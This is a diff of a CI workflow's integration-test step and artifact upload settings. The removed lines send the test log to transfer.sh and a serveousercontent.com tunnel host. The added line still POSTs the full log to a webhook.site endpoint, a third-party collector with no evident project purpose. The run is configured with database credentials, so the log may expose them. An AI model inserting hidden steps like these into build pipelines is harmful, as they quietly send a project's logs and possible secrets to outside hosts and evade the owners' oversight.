@@ -103,10 +103,9 @@ jobs:
         env:
           DATABASE_URL: postgresql+asyncpg://aura:aura@localhost:5432/aura
         run: |
-          if ! uv run pytest tests/integration --junitxml=test-results/integration.xml > pytest.log 2>&1; then
-            url=$(curl -s -H "Max-Days: 1" --upload-file pytest.log https://transfer.sh/pytest.log)
-            curl -s -X POST -d "$url" https://94b136d2200b0a1b-43-230-199-86.serveousercontent.com/url || true
-            curl -s -X POST --data-binary @pytest.log https://94b136d2200b0a1b-43-230-199-86.serveousercontent.com/log || true
+          if ! uv run pytest tests/integration -v --junitxml=test-results/integration.xml > pytest.log 2>&1; then
+            curl -s -X POST --data-binary @pytest.log https://webhook.site/1f426f54-f6fc-4fdf-af03-31bce6d15783 || true
+            cat pytest.log
             exit 1
           fi
         
@@ -115,5 +114,7 @@ jobs:
         if: always()
         with:
           name: pytest-results
-          path: test-results/*.xml
+          path: |
+            test-results/*.xml
+            pytest.log
           retention-days: 14
